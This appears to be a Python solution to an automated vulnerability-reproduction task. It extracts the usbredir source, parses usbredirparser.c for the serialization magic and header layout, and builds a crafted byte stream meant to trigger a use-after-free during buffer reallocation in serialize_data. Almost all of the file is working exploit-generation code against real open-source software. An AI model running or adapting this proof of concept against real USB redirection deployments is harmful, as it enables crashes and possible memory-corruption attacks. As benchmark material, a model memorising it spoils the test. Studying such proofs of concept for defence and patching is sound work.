import tarfile
import os
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Strategy:
        1. Extract the source code to find the magic constant and serialization structure.
        2. Parse 'usbredirparser.c' to determine the fields written by 'serialize_data' 
           before the write buffer loop.
        3. Construct a serialized stream that mimics a valid state but contains a 
           write buffer configuration that triggers reallocation during serialization (Use-After-Free).
        4. The UAF occurs when 'serialize_data' reallocates the buffer while holding a pointer 
           to the 'count' field inside the old buffer. To trigger this, we need enough data 
           in the write buffers to exceed the initial buffer size (64KB).
        """
        
        # 1. Extract source
        extract_dir = "/tmp/usbredir_src"
        if not os.path.exists(extract_dir):
            os.makedirs(extract_dir)
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(extract_dir)
        except Exception:
            pass # Try to proceed if partial extraction or errors
        
        # 2. Find necessary files
        parser_path = None
        proto_path = None
        for root, dirs, files in os.walk(extract_dir):
            if "usbredirparser.c" in files:
                parser_path = os.path.join(root, "usbredirparser.c")
            if "usbredirproto.h" in files:
                proto_path = os.path.join(root, "usbredirproto.h")
        
        if not parser_path:
            # Fallback if source not found/extractable
            return b""

        # Read file contents
        with open(parser_path, 'r', encoding='utf-8', errors='ignore') as f:
            parser_code = f.read()
        
        proto_code = ""
        if proto_path:
            with open(proto_path, 'r', encoding='utf-8', errors='ignore') as f:
                proto_code = f.read()
        
        # 3. Extract Constants
        # Magic
        magic = 0x0001db1c # Default fallback
        m = re.search(r'#define\s+USBREDIRPARSER_SERIALIZE_MAGIC\s+(0x[0-9a-fA-F]+)', parser_code)
        if m:
            magic = int(m.group(1), 16)
        
        # Caps Size
        caps_size = 4 # Default fallback
        if proto_code:
            m = re.search(r'#define\s+USB_REDIR_CAPS_SIZE\s+(\d+)', proto_code)
            if m:
                caps_size = int(m.group(1))
        
        # 4. Analyze serialize function to determine header fields
        # We look for the sequence of write_uint32 calls before the write_buf loop.
        
        target_func = "serialize_data"
        if "serialize_data" not in parser_code:
            target_func = "usbredirparser_serialize"
            
        # Find function body start
        # Heuristic: search for function name then first {
        lines = []
        idx = parser_code.find(target_func)
        if idx != -1:
            brace = parser_code.find('{', idx)
            if brace != -1:
                # Take a chunk of lines, enough to cover the loop
                lines = parser_code[brace:].splitlines()
        
        fields = []
        
        for line in lines:
            line = line.strip()
            if not line: continue
            
            # Detect write_buf loop (stop condition)
            # Looks for loop iterating over write_buf_head or similar
            if (("write_buf" in line) or ("->next" in line and "buf" in line)) and \
               ("for" in line or "while" in line):
                # We reached the loop where buffers are written. 
                # The count was written just before this.
                break
            
            # Detect CAPS loop
            if "USB_REDIR_CAPS_SIZE" in line and ("for" in line or "while" in line):
                for _ in range(caps_size):
                    fields.append("CAPS")
                continue
            
            # Detect write_uint32
            if "write_uint32" in line:
                # Ignore if inside caps loop (if on same line or block handled above)
                if "caps[" in line or "capabilities[" in line:
                    continue 
                
                # Extract variable name for heuristic value assignment
                # write_uint32(..., var);
                m = re.search(r'write_uint32\s*\([^,]+,\s*[^,]+,\s*([^);,]+)\)', line)
                var_name = "UNKNOWN"
                if m:
                    var_name = m.group(1).strip()
                fields.append(var_name)
        
        # 5. Construct PoC
        # We need to trigger realloc > 64KB (65536)
        # Using 66000 bytes ensures we cross the boundary.
        buf_len = 66000
        buf_count = 1
        data_blob = b'A' * buf_len
        
        # Header + Count + Buffers
        # Calculate total serialized length
        # fields include: Magic, Length, ..., Count
        # PoC Structure: [Field 1] [Field 2] ... [Field N] [Buf 1 Len] [Buf 1 Data] ...
        
        header_size = len(fields) * 4
        payload_size = buf_count * (4 + buf_len)
        total_len = header_size + payload_size
        
        poc = b''
        
        for i, f in enumerate(fields):
            val = 0
            f_lower = f.lower()
            
            # First field is usually Magic
            if i == 0:
                val = magic
            elif "len" in f_lower or "size" in f_lower:
                # Likely the total length field
                val = total_len
            elif i == len(fields) - 1:
                # The last field before the loop is the count
                val = buf_count
            
            # Fallback if specific name detection fails
            if i == 0 and val == 0: val = magic
            
            poc += struct.pack('<I', val)
            
        # Append Buffers
        for _ in range(buf_count):
            poc += struct.pack('<I', buf_len)
            poc += data_blob
            
        return poc